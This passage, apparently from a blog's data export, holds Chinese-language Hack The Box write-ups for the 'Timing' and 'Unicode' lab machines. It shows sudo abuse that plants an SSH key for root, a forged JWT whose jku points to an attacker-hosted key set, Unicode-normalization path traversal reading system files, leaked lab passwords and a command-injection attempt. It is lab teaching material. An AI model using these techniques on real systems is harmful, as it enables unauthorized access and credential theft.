有共同的子目录\n0-e4e214696159a25c69812571c8214d2bf8736a3f/js 和 1-16de2698b5b122c93461298eab730d00273bd83e/js 有共同的子目录\n```\n数据库凭证已被修改为S3cr3t\\_unGu3ss4bl3\\_p422w0Rd，现在我们使用ssh进行登录\n\n```bash\n┌──(root💀root)-[~/Desktop]\n└─# ssh aaron@10.10.11.135\naaron@10.10.11.135's password: \nWelcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri Dec 31 17:46:35 UTC 2021\n\n  System load:  0.0               Processes:           180\n  Usage of /:   51.5% of 4.85GB   Users logged in:     1\n  Memory usage: 18%               IP address for eth0: 10.10.11.135\n  Swap usage:   0%\n\n8 updates can be applied immediately.\n8 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Fri Dec 31 17:46:08 2021 from 10.10.14.52\naaron@timing:~$ whoami&&id\naaron\nuid=1000(aaron) gid=1000(aaron) groups=1000(aaron)\n```\n成功登录aaron用户\n\n```bash\naaron@timing:~$ cat user.txt \na3376cc0a8af0e0aa3f66bec0adec1d5\n```\n成功拿到user权限的flag文件\n\n## 权限提升\n```bash\naaron@timing:~$ sudo -l\nMatching Defaults entries for aaron on timing:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser aaron may run the following commands on timing:\n    (ALL) NOPASSWD: /usr/bin/netutils\n```\n首先查看一下sudo权限\n\n可以以root权限执行/usr/bin/netutils这个二进制文件，研究研究\n\n```bash\naaron@timing:~$ cat /usr/bin/netutils\n#! /bin/bash\njava -jar /root/netutils.jar\naaron@timing:~$ file /usr/bin/netutils\n/usr/bin/netutils: Bourne-Again shell script, ASCII text executable\n```\n首先查看一下文件类型\n\n这是一个bash脚本，功能是从根目录下载运行一个java文件，执行一下试试\n\n```bash\naaron@timing:~$ sudo /usr/bin/netutils\nnetutils v0.1\nSelect one option:\n[0] FTP\n[1] HTTP\n[2] Quit\nInput >>\n```\n执行后给了我们两个选项，FTP还是HTTP，设置一个HTTP然后下载测试文件看看把\n\n```bash\n┌──(root💀root)-[~/Desktop]\n└─# python3 -m http.server 80                                                                                                                                                                                 2 ⨯\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n```bash\naaron@timing:~$ sudo /usr/bin/netutils\nnetutils v0.1\nSelect one option:\n[0] FTP\n[1] HTTP\n[2] Quit\nInput >> 1\nEnter Url: 10.10.14.52/test.txt\nInitializing download: http://10.10.14.52/test.txt\nFile size: 14 bytes\nOpening output file test.txt\nServer unsupported, starting from scratch with one connection.\nStarting download\n\nDownloaded 14 byte in 0 seconds. (0.02 KB/s)\n\nnetutils v0.1\nSelect one option:\n[0] FTP\n[1] HTTP\n[2] Quit\nInput >> 2\naaron@timing:~$ ls -la test.txt \n-rw-r--r-- 1 root root 14 Dec 31 17:58 test.txt\n```\n成功从我们本地下载了这个文件，并且是root权限的，那就好办了\n\n接着对root账户下的.ssh文件创建一个链接\n\n```bash\naaron@timing:~$ ln -s /root/.ssh/authorized_keys keys\nln: failed to access 'keys': Permission denied\naaron@timing:~$ ls -la\ntotal 52\ndrwxr-x--x 5 aaron aaron 4096 Dec 31 18:06 .\ndrwxr-xr-x 3 root  root  4096 Dec  2 09:55 ..\nlrwxrwxrwx 1 root  root     9 Oct  5 15:33 .bash_history -> /dev/null\n-rw-r--r-- 1 aaron aaron  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 aaron aaron 3771 Apr  4  2018 .bashrc\ndrwx------ 2 aaron aaron 4096 Nov 29 01:34 .cache\ndrwx------ 3 aaron aaron 4096 Nov 29 01:34 .gnupg\nlrwxrwxrwx 1 aaron aaron   26 Dec 31 18:06 keys -> /root/.ssh/authorized_keys\ndrwxrwxr-x 3 aaron aaron 4096 Nov 29 01:34 .local\nlrwxrwxrwx 1 aaron aaron   11 Dec 31 17:54 passwd -> /etc/passwd\nlrwxrwxrwx 1 aaron aaron   11 Dec 31 18:02 passwd.0 -> /etc/passwd\n-rw-r--r-- 1 root  root  1735 Dec 31 17:57 passwd.1\nlrwxrwxrwx 1 aaron aaron   11 Dec 31 17:57 passwd.2 -> /etc/passwd\n-rw-r--r-- 1 root  root  1735 Dec 31 17:57 passwd.3\n-rw-r--r-- 1 root  root  1735 Dec 31 18:03 passwd.4\n-rw-r--r-- 1 aaron aaron  807 Apr  4  2018 .profile\n-rw-r--r-- 1 root  root    14 Dec 31 17:58 test.txt\n-rw-r----- 1 root  aaron   33 Dec 31 17:51 user.txt\nlrwxrwxrwx 1 root  root     9 Oct  5 15:33 .viminfo -> /dev/null\n```\n接着在本地创建一个ssh的密钥，然后复制到桌面，改名为keys\n\n```bash\n┌──(root💀root)-[~/Desktop]\n└─# ssh-keygen       \nGenerating public/private rsa key pair.\nEnter file in which to save the key (/root/.ssh/id_rsa): \nEnter passphrase (empty for no passphrase): \nEnter same passphrase again: \nYour identification has been saved in /root/.ssh/id_rsa\nYour public key has been saved in /root/.ssh/id_rsa.pub\nThe key fingerprint is:\nSHA256:M12TnW2ZwayF1exH6fYv+fqbplhkdyxg/9oFI+yu7os root@root\nThe key's randomart image is:\n+---[RSA 3072]----+\n|              =+o|\n|             + BB|\n|            * *=o|\n|         . + = =o|\n|        S . oo*.=|\n|         o .o..=o|\n|            .. .+|\n|         . .o o++|\n|        Eo=+..=B=|\n+----[SHA256]-----+\n\n┌──(root💀root)-[~/Desktop]\n└─# ls -la /root/.ssh                                                   \n总用量 20\ndrwx------  2 root root 4096  1月  1 12:56 .\ndrwx------ 28 root root 4096  1月  1 12:56 ..\n-rw-------  1 root root 2590  1月  1 12:56 id_rsa\n-rw-r--r--  1 root root  563  1月  1 12:56 id_rsa.pub\n-rw-r--r--  1 root root 3772 12月 31 17:45 known_hosts\n\n┌──(root💀root)-[~/Desktop]\n└─# cp /root/.ssh/id_rsa.pub keys     \n\n┌──(root💀root)-[~/Desktop]\n└─# ls               \nkeys\n\n┌──(root💀root)-[~/Desktop]\n└─# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n接着使用python3开启一个http服务\n\n```bash\naaron@timing:~$ sudo /usr/bin/netutils\nnetutils v0.1\nSelect one option:\n[0] FTP\n[1] HTTP\n[2] Quit\nInput >> 1\nEnter Url: http://10.10.14.52/keys\nInitializing download: http://10.10.14.52/keys\nFile size: 563 bytes\nOpening output file keys\nServer unsupported, starting from scratch with one connection.\nStarting download\n\nDownloaded 563 byte in 0 seconds. (0.91 KB/s)\n\nnetutils v0.1\nSelect one option:\n[0] FTP\n[1] HTTP\n[2] Quit\nInput >> 2\n```\n接着使用/usr/bin/netutils来下载keys\n\n然后使用ssh -i进行连接登录\n\n```bash\n┌──(root💀root)-[~/.ssh]\n└─# ssh -i id_rsa root@10.10.11.135\nWelcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat Jan  1 13:29:39 UTC 2022\n\n  System load:  0.0               Processes:           202\n  Usage of /:   48.7% of 4.85GB   Users logged in:     1\n  Memory usage: 10%               IP address for eth0: 10.10.11.135\n  Swap usage:   0%\n\n8 updates can be applied immediately.\n8 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Tue Dec  7 12:08:29 2021\nroot@timing:~# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功拿到root权限\n\n```bash\nroot@timing:~# ls\naxel  netutils.jar  root.txt\nroot@timing:~# cat root.txt \nc9e18f123e0e2012bbf16a0f64bc3715\n```\n成功拿到root权限的flag文件","tags":["Hackthebox"]},{"title":"Unicode - Hackthebox","url":"/2021/12/16/Hackthebox/Medium/Hackthebox-Unicode/","content":"\n# Hackthebox - Unicode\n## 靶场信息\n![](Hackthebox-Unicode/711534dd-e3e3-455e-b9cb-477b4f00229b.png)\n\n## 靶场类型\n![](Hackthebox-Unicode/c4a1fa84-f27c-471e-a92f-7837ccb7d6ef.png)\n\n## 信息搜集\n首先使用nmap进行端口扫描\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.126 \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 01:22 EST\nNmap scan report for 10.10.11.126\nHost is up (0.22s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)\n|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)\n|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-generator: Hugo 0.83.1\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Hackmedia\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=12/4%OT=22%CT=1%CU=41014%PV=Y%DS=2%DC=T%G=Y%TM=61AB094\nOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=C)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT       ADDRESS\n1   217.74 ms 10.10.14.1\n2   217.99 ms 10.10.11.126\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 48.13 seconds\n```\n这里只扫描到22和80端口，去80端口看一下http服务内容\n\n![](Hackthebox-Unicode/2ace0ac1-bc26-4f62-8df2-77d340d116f8.png)\n\n这好像是一个威胁情报公司的官网，老规矩，一边扫描目录，一边看网站\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.11.126/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 9294\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.126/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 9294\n________________________________________________\n\n.                       [Status: 200, Size: 2078, Words: 363, Lines: 69]\n:: Progress: [43003/43003] :: Job [1/1] :: 155 req/sec :: Duration: [0:04:48] :: Errors: 0 ::\n```\n加了过滤后没扫出来东西，只能去一个个功能检查了\n\n![](Hackthebox-Unicode/f83a3bbd-edc9-4310-a68c-81c3be8e67ba.png)\n\n随便注册一个账号去试试能不能登录\n\n![](Hackthebox-Unicode/3a7cf3fd-6abb-4f17-9ebd-319954c86f64.png)\n\n登录后的页面，到处看看有没有什么可以利用的点吧\n\n看到这里有一个上传点，上传试试吧\n\n![](Hackthebox-Unicode/5c0f041a-46e7-4e08-9fbe-d8f7d5ff86d3.png)\n\n![](Hackthebox-Unicode/4a791ef7-ea19-4932-8a1d-54a31c69d157.png)\n\n传是可以传的，但是感觉无法执行和不知道上传后的地址，放弃，看看其他思路\n\n![](Hackthebox-Unicode/821d7155-9197-42c3-be59-e32c813bb26a.png)\n\n查看了一下cookie，莫名觉得眼熟，这不是JWT吗\n\n复制到JWT.IO去看看\n\n> [https://jwt.io/](https://jwt.io/)\n\n![](Hackthebox-Unicode/daead21a-787b-49e4-9ea1-42b488c35491.png)\n\n获得了一个新的URL **http://hackmedia.htb/static/jwks.json**\n\n我们把这个页面添加到hosts里\n\n```bash\necho 10.10.11.126 hackmedia.htb >> /etc/hosts\n```\n![](Hackthebox-Unicode/b0fa0124-6006-40ec-95a2-b2764096dfb1.png)\n\n然后再去访问这个URL\n\n将获取到的json保存到本地\n\n```bash\ncurl http://hackmedia.htb/static/jwks.json > jwks.json\n```\n> [https://hackernoon.com/json-web-tokens-jwt-demystified-f7e202249640](https://hackernoon.com/json-web-tokens-jwt-demystified-f7e202249640)\n\n> [https://openid.net/specs/draft-jones-json-web-key-03.html#Acknowledgements](https://openid.net/specs/draft-jones-json-web-key-03.html#Acknowledgements)\n\n找到两篇jwt相关的文章，大家有兴趣的自己看一下吧，我就不详细讲解了\n\n> [https://mkjwk.org/](https://mkjwk.org/)\n\n使用在线工具生成一个jwt的key\n\n![](Hackthebox-Unicode/0ab6f077-6a92-4a4a-98ce-7ed9d9368c5d.png)\n\n然后使用我们生成出来的json里的n值，替换掉我们保存的json里的n值\n\n![](Hackthebox-Unicode/b50647b2-5227-4025-b73a-c5157e153432.png)\n\n## 漏洞利用\n使用python3开启一个http服务\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# python3 -m http.server 80                                                      \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n![](Hackthebox-Unicode/e326b6a3-ef67-4583-ab14-b10833e0e072.png)\n\n用admin替换掉我们的用户名，然后将新生成的key填入后生成新的JWT令牌\n\n```bash\n{\n  \"typ\": \"JWT\",\n  \"alg\": \"RS256\",\n  \"jku\": \"http://hackmedia.htb/static/../redirect?url=10.10.14.14/jwks.json\"\n}\n```\n```bash\neyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuMTQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.BKe3g8gh_oyrQIjTOgSh4AqIKTHI79jQQhSG1t-jVxx0pvXL0yCAJi0gXvKpNSbKG_cVpzXlVT4e_mNmfF1-IqoneHTmkhEAMFR0ZT4AeVykvDFTlqaKJj2mgjTcXZ_S8odcWAQNRuzondUaOjRT9wr-_CrPm5xkbUwX_mu3p2jM1AWFISba8XM6bcnIBalRb398-7KJIveBaOhqmjEVdV4voFaBBMU7vS8yS4hhhzgE6NdvxiHPIeSFUYGpD9HcZXPmIgNAY1UmJjwMrF0n1N_MFGB_7oCK5KlTq4IIx4qRGQ8_JhAw8haQbC1jwC6A3zlHzqMVSfoafd6BdtYZ4A\n```\n![](Hackthebox-Unicode/fb86d951-b6db-4e86-bb44-31bcdecc09d6.png)\n\n```bash\nhttp://hackmedia.htb/login/\n```\n得到了我们的新的令牌，然后去替换掉令牌\n\n替换掉以后刷新页面\n\n![](Hackthebox-Unicode/1970487f-a491-4114-97c6-f22af254c80e.png)\n\n成功进入后台\n\n![](Hackthebox-Unicode/df0a2712-b52f-4d76-91bb-fe0a3a185a4f.png)\n\n点击这俩随便一个，会跳转到对应的pdf文件，这里经过各种测试，然后与朋友沟通后，发现可能是由于浏览器机制的原因，导致使用Firefox会有点问题，所以这里我换成了Chrome来执行\n\n![](Hackthebox-Unicode/dd90b81c-6f87-4ec3-b1bf-ceebc62f9bb5.png)\n\n看着这个结构，我感觉有本地文件读取的漏洞，测一下\n\n![](Hackthebox-Unicode/c455995a-d83c-4f68-9dde-0ec54d56ab54.png)\n\n这里404了，但是却提示了我们有过滤，并且说我们永远也过不去这个过滤？\n\n这我就不服了，不就unicode吗，绕他丫的\n\n> [https://lazarv.com/posts/unicode-normalization-vulnerabilities/](https://lazarv.com/posts/unicode-normalization-vulnerabilities/)\n\n![](Hackthebox-Unicode/d28f11dd-44d6-4c8a-b956-a911302576fe.png)\n\n![](Hackthebox-Unicode/99cc7f8c-a1fe-4835-96d1-f7c4fdc2848c.png)\n\n看样子过滤是绕过去了，但是没访问到文件，那就层数不够嘛，再多加几层就好了\n\n![](Hackthebox-Unicode/3e9a2e3f-8143-434c-a1f5-f95d23692fd6.png)\n\n```bash\nhttp://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd\n```\n这不就读取到了吗\n\n```bash\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nmysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false\ncode:x:1000:1000:,,,:/home/code:/bin/bash\n```\n这里看到有一个mysql的权限组，去读取mysql的密码，但不知道mysql路径在哪\n\n![](Hackthebox-Unicode/31bbfb38-fec6-4f5b-8496-2f726ef6e4d8.png)\n\n我们知道nginx在这台靶机上运行着呢，试着去读取一下nginx的配置文件\n\n```bash\nhttp://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default\n```\n![](Hackthebox-Unicode/4eac2bc5-4915-4efb-98c1-535bc8d099e7.png)\n\n```bash\nhttp://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml\n```\n我们在nginx的配置文件里得到了一个路径\n\n![](Hackthebox-Unicode/a22ff1cd-556b-4feb-8971-f8cb49cd4821.png)\n\n得到了code的用户密码，然后在passwd里我似乎看到code用户有ssh权限，去尝试一下\n\n```bash\nusername = code\npassword = B3stC0d3r2021@@!\n```\n```bash\ncode@code:~$ whoami&&id\ncode\nuid=1000(code) gid=1000(code) groups=1000(code)\n```\nOK，拿到user权限的shell了\n\n```bash\ncode@code:~$ ls\ncoder  user.txt\ncode@code:~$ cat user.txt \n280ae5b99ba2b4de934bbd3b7f0fb0fd\n```\n拿到user权限的flag文件\n\n## 权限提升\n```bash\ncode@code:~$ sudo -l\nMatching Defaults entries for code on code:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser code may run the following commands on code:\n    (root) NOPASSWD: /usr/bin/treport\n```\nsudo -l看到有一个可以免密码root权限执行的二进制文件，执行一下看看什么效果\n\n```bash\ncode@code:~$ sudo /usr/bin/treport\n1.Create Threat Report.\n2.Read Threat Report.\n3.Download A Threat Report.\n4.Quit.\nEnter your choice:\n```\n好像是个威胁报告生成的？\n\n先正常使用一下功能看看\n\n```bash\ncode@code:~$ sudo /usr/bin/treport\n1.Create Threat Report.\n2.Read Threat Report.\n3.Download A Threat Report.\n4.Quit.\nEnter your choice:1\nEnter the filename:lucifiel\nEnter the report:lucifiel\nEnter your choice:2\nALL THE THREAT REPORTS:\nlucifiel\n\nEnter the filename:3\nSOMETHING IS WRONG\n\nEnter your choice:3\nEnter the IP/file_name:lucifiel\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: lucifiel\nEnter your choice:lucifiel||whoami\nWrong Input\ncode@code:~$ sudo /usr/bin/treport\n1.Create Threat Report.\n2.Read Threat Report.\n3.Download A Threat Report.\n4.Quit.\nEnter your choice:4\ncode@code:~$ sudo /usr/bin/treport\n1.Create Threat Report.\n2.Read Threat Report.\n3.Download A Threat Report.\n4.Quit.\nEnter your choice:3\nEnter the IP/file_name:^CTraceback (most recent call last):\n  File \"treport.py\", line 79, in <module>\n  File \"treport.py\", line 43, in download\nKeyboardInterrupt\n[1431] Failed to execute script 'treport' due to unhandled exception!\n```\n随便使用了了一下功能，发现下载功能似乎是使用了curl进行读取，并且调用了python文件，这里使用工具给提取出python脚本看一下\n\n> [https://github.com/LucifielHack/pyinstxtractor](https://github.com/LucifielHack/pyinstxtractor)\n\n首先使用scp将二进制文件下载下来\n\n```bash\n┌──(root💀kali)-[~/Desktop/pyinstxtractor]\n└─# scp code@10.10.11.126:/usr/bin/treport ./\ncode@10.10.11.126's password: \ntreport\n```\n```bash\n┌──(root💀kali)-[~/Desktop/pyinstxtractor]\n└─# python3 pyinstxtractor.py treport                                    \n[+] Processing treport\n[+] Pyinstaller version: 2.1+\n[+] Python version: 38\n[+] Length of package: 6798297 bytes\n[+] Found 46 files in CArchive\n[+] Beginning extraction...please standby\n[+] Possible entry point: pyiboot01_bootstrap.pyc\n[+] Possible entry point: pyi_rth_pkgutil.pyc\n[+] Possible entry point: pyi_rth_multiprocessing.pyc\n[+] Possible entry point: pyi_rth_inspect.pyc\n[+] Possible entry point: treport.pyc\n[!] Warning: This script is running in a different Python version than the one used to build the executable.\n[!] Please run this script in Python38 to prevent extraction errors during unmarshalling\n[!] Skipping pyz extraction\n[+] Successfully extracted pyinstaller archive: treport\n\nYou can now use a python decompiler on the pyc files within the extracted directory\n```\n> [https://github.com/LucifielHack/pycdc](https://github.com/LucifielHack/pycdc)\n\n这里使用一个py和c++的反编译工具\n\n进入目录\n\n```bash\ncmake CMakeLists.txt\n选择y\n```\n```bash\n┌──(root💀kali)-[~/Desktop/pyinstxtractor/pycdc]\n└─# cmake CMakeLists.txt                                                                                                                                                                                        2 ⨯\n-- The C compiler identification is GNU 10.2.1\n-- The CXX compiler identification is GNU 10.2.1\n-- Detecting C compiler ABI info\n-- Detecting C compiler ABI info - done\n-- Check for working C compiler: /usr/bin/cc - skipped\n-- Detecting C compile features\n-- Detecting C compile features - done\n-- Detecting CXX compiler ABI info\n-- Detecting CXX compiler ABI info - done\n-- Check for working CXX compiler: /usr/bin/c++ - skipped\n-- Detecting CXX compile features\n-- Detecting CXX compile features - done\n-- Found PythonInterp: /usr/bin/python (found version \"2.7.18\") \n-- Configuring done\n-- Generating done\n-- Build files have been written to: /root/Desktop/pyinstxtractor/pycdc\n\n┌──(root💀kali)-[~/Desktop/pyinstxtractor/pycdc]\n└─# make\n[  2%] Generating bytes/python_10.cpp, bytes/python_11.cpp, bytes/python_13.cpp, bytes/python_14.cpp, bytes/python_15.cpp, bytes/python_16.cpp, bytes/python_20.cpp, bytes/python_21.cpp, bytes/python_22.cpp, bytes/python_23.cpp, bytes/python_24.cpp, bytes/python_25.cpp, bytes/python_26.cpp, bytes/python_27.cpp, bytes/python_30.cpp, bytes/python_31.cpp, bytes/python_32.cpp, bytes/python_33.cpp, bytes/python_34.cpp, bytes/python_35.cpp, bytes/python_36.cpp, bytes/python_37.cpp, bytes/python_38.cpp, bytes/python_39.cpp, bytes/python_310.cpp                                                                                              \n[  4%] Building CXX object CMakeFiles/pycxx.dir/bytecode.cpp.o\n[  7%] Building CXX object CMakeFiles/pycxx.dir/data.cpp.o\n[  9%] Building CXX object CMakeFiles/pycxx.dir/pyc_code.cpp.o\n[ 12%] Building CXX object CMakeFiles/pycxx.dir/pyc_module.cpp.o\n[ 14%] Building CXX object CMakeFiles/pycxx.dir/pyc_numeric.cpp.o\n[ 17%] Building CXX object CMakeFiles/pycxx.dir/pyc_object.cpp.o\n[ 19%] Building CXX object CMakeFiles/pycxx.dir/pyc_sequence.cpp.o\n[ 21%] Building CXX object CMakeFiles/pycxx.dir/pyc_string.cpp.o\n[ 24%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_10.cpp.o\n[ 26%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_11.cpp.o\n[ 29%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_13.cpp.o\n[ 31%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_14.cpp.o\n[ 34%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_15.cpp.o\n[ 36%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_16.cpp.o\n[ 39%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_20.cpp.o\n[ 41%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_21.cpp.o\n[ 43%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_22.cpp.o\n[ 46%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_23.cpp.o\n[ 48%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_24.cpp.o\n[ 51%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_25.cpp.o\n[ 53%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_26.cpp.o\n[ 56%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_27.cpp.o\n[ 58%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_30.cpp.o\n[ 60%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_31.cpp.o\n[ 63%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_32.cpp.o\n[ 65%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_33.cpp.o\n[ 68%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_34.cpp.o\n[ 70%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_35.cpp.o\n[ 73%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_36.cpp.o\n[ 75%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_37.cpp.o\n[ 78%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_38.cpp.o\n[ 80%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_39.cpp.o\n[ 82%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_310.cpp.o\n[ 85%] Linking CXX static library libpycxx.a\n[ 85%] Built target pycxx\n[ 87%] Building CXX object CMakeFiles/pycdas.dir/pycdas.cpp.o\n[ 90%] Linking CXX executable pycdas\n[ 90%] Built target 